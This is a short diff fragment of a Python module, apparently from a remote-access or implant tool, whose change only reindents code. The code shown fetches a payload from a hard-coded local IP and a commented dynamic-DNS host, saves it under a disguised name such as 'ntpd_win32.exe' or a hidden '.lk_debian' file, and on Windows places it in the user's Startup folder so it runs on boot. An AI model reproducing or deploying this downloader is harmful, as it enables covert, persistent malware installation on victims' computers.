@@ -38,21 +38,21 @@ def run(**args):
     print('[*] In getFileFromURI module.')
     global bin, url, ScriptExec, OsTargetpath, shellcode
     if os.name == 'nt':
-      bin = True
-      ScriptExec = "python"
-      url = "http://192.168.2.112:8000/nj"   #"http://saw-dsr.ddns.net:8000/nj"
-      OsTargetpath = "ntpd_win32.exe"
-      if winRunOnBoot == True:
-          OsTargetpath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\ntpd_win32.exe"
+        bin = True
+        ScriptExec = "python"
+        url = "http://192.168.2.112:8000/nj"   #"http://saw-dsr.ddns.net:8000/nj"
+        OsTargetpath = "ntpd_win32.exe"
+        if winRunOnBoot == True:
+            OsTargetpath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\ntpd_win32.exe"
 
     elif os.name == 'posix':
-      bin = True
-      ScriptExec = "python3.6 "
-      url = "http://192.168.2.112:8000/lk_debian"   #"http://saw-dsr.ddns.net:8000/TCP_client.py"
-      OsTargetpath = ".lk_debian"
-      #TODO if linRunOnBoot:
+        bin = True
+        ScriptExec = "python3.6 "
+        url = "http://192.168.2.112:8000/lk_debian"   #"http://saw-dsr.ddns.net:8000/TCP_client.py"
+        OsTargetpath = ".lk_debian"
+        #TODO if linRunOnBoot:
     else:
-      return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
+        return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 
     try:
         http = urllib3.PoolManager()
